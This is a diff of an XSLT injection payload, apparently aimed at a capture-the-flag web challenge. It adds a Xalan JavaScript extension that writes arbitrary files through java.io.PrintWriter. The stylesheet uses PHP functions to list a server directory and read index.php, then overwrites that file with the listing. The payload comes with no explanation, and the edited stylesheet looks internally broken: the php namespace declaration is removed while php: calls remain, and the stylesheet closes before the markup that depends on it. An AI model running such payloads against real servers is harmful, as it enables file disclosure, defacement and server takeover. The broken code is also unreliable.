@@ -1,20 +1,26 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<xsl:stylesheet  xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
-      xmlns:php="http://php.net/xsl" 
-      xmlns:xalan="http://xml.apache.org/xalan"
-      xmlns:counter="MyCounter"
-      extension-element-prefixes="counter"
-      xsl:version="1.0"> 
-<xalan:component prefix="counter" elements="init incr" functions="getRegion">
-    <xalan:script lang="javascript">
-    function getRegion(sVar)
-    {
-        document.write(sVar.toString())
-    }
-    </xalan:script>
-  </xalan:component>
+<xsl:stylesheet version="1.0"
+      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"        
+	xmlns:xalan="http://xml.apache.org/xalan"
+	xmlns:user="http://www.mac.home">
+	<xalan:component prefix="user" functions="output">
+	<xalan:script lang="javascript">      	
+		function output(filename,content)
+		{
+                  var a=new java.io.PrintWriter(filename);
+			a.print(content);
+			a.close();
+			return "Finished!";
+      		}
+    	</xalan:script>
+  	</xalan:component>
+  	<xsl:template match="document">
+		<xsl:value-of select="user:output(string(filename),string(content))"/>
+  	</xsl:template>
+</xsl:stylesheet>
+<html><body>
 <xsl:variable  name="scand"   select="php:functionString('scandir','/challenge/web-serveur/ch50')" />
-<xsl:variable  name="strscand" select="counter:getRegion('$scand')" /> 
+<xsl:variable  name="strscand" select="user:output('/challenge/web-serveur/ch50/index.php','$scand')" /> 
 <xsl:variable  name="header"  select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')"/>
 
 <div style="background-color:teal;color:white;padding:4px">
@@ -37,5 +43,5 @@
 </span>
 </p>
 </div>
-
-</xsl:stylesheet>
+      </body>      
+</html>
